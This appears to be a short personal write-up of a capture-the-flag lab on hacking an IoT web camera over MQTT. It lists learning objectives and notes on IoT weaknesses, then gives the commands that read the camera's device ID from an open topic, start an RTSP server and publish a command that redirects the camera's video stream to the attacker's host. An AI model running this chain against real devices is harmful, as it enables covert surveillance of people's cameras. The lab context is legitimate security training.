## Day 21
Title
IoT Web Camera v.1.6
IP Address
10.10.42.220 
IOT Camera Hacking
MQTT (Message Queuing Telemetry Transport)

### Learning Objectives
```
Explain the Internet of Things, why it is important, and if we should be concerned about their danger.
Understand the difference between an IoT-specific protocol and other network service protocols.
Understand what a publish/subscribe model is and how it interacts with IoT devices.
Analyze and exploit the behavior of a vulnerable IoT device.
```

 ###  Reasons exist to study IoT
 * IoT categorizes unique devies, lightweight meaning functionality and features are limited to only essentials. Modern Features may be left overlooked(most concerned sec)
 * Interconnected and no human interaction. Negotiate a secure means of communication is not required, e.g. using password.
 * If device A is using X protocol, device D is using Y protocol, presents significant problem in compatibility. Falling it to insecure communication.

```
 └─# mosquitto_sub -h 10.10.42.220 -t device/init                      
E6QTQ8O9P9L8TJVXR4PT
E6QTQ8O9P9L8TJVXR4PT
E6QTQ8O9P9L8TJVXR4PT
^C                                                                                        ``` 



──(root㉿kali)-[~]
└─# docker run --rm -it --network=host aler9/rtsp-simple-server
Unable to find image 'aler9/rtsp-simple-server:latest' locally

latest: Pulling from aler9/rtsp-simple-server
d7c47958dda1: Pull complete 
Digest: sha256:44ce06f758a74f316ae4d912706c5212af2fb4765137e119ff689c5ec327dc94
Status: Downloaded newer image for aler9/rtsp-simple-server:latest



mosquitto_pub -h <Rip> -t device/E6QTQ8O9P9L8TJVXR4PT/cmd -m """{"cmd":"10", "url":"rtsp://<Lip>:8554/"}"""




vlc rtsp://127.0.0.1:8554/path

